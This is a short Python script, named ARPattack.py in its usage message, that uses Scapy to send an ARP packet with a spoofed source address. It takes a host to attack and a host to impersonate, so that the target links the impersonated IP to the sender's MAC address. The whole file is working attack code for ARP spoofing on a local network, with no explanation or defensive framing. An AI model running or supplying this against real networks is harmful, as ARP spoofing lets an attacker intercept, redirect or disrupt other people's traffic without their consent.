#!/usr/bin/python3

from scapy.all import *
import sys

def get_mac_address():
    my_mac = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_mac:
        if(mac!='00:00:00:00:00:00'):
            return mac
Timeout = 2

if len(sys.argv)!=3:
    print("Usage: ARPattack.py HOST_TO_ATTACK HOST_TO_IMPERSONATE")
    sys.exit(1)
my_mac = get_mac_address()
if not my_mac:
    print("FAIL")
    sys.exit(1)

packet = Ether()/ARP(op="who-has", hwsrc=my_mac,psrc=sys.argv[2],pdst=sys.argv[1])
packet.show()
ans = sr1(packet)
#ans.show()
